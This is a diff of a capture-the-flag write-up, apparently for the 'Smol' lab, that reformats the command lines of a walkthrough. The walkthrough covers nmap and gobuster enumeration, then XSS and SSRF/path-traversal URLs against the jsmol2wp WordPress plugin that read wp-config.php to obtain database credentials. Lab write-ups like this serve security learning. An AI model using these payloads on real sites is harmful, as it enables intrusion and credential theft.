@@ -27,7 +27,7 @@ Nmap Scan
 
 An Nmap scan was performed to identify open ports and services running on the target.
 
-nmap -sC -sV 10.10.231.99
+    nmap -sC -sV 10.10.231.99
 
 Nmap Output - Initial Findings:
 
@@ -67,7 +67,7 @@ Gobuster Directory Enumeration
 
 With the hostname configured, gobuster was used to enumerate directories and files on the web server using a common wordlist.
 
-gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirb/common.txt
+    gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirb/common.txt
 
 Gobuster Output - WordPress Identification:
 
@@ -117,17 +117,17 @@ Guided by wpscan's output and subsequent manual inspection, the jsmol2wp plugin 
 
 # XSS Vulnerability (Example Payload):
 
-http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
+    http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
 
 # SSRF Vulnerability (Target Payload):
 
-http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+    http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 
 Exploiting SSRF to Obtain Database Credentials
 
 The SSRF vulnerability was leveraged to read the contents of the wp-config.php file, which typically contains the WordPress database credentials.
 
-http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+    http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
 
 This request successfully returned the wp-config.php content, revealing the following database user and password:
 
